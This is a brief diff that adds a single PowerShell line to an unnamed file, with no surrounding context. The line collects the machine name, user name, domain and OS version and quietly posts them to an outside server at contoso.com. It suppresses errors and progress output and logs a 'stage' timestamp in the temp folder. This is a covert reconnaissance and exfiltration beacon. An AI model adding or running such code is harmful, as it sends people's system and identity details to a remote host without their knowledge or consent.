@@ -1,0 +1,2 @@
+
+$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN; OSVersion = [Environment]::OSVersion.VersionString }; Invoke-RestMethod -Uri "http://contoso.com:80/upload" -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $ProgressPreference = "SilentlyContinue"
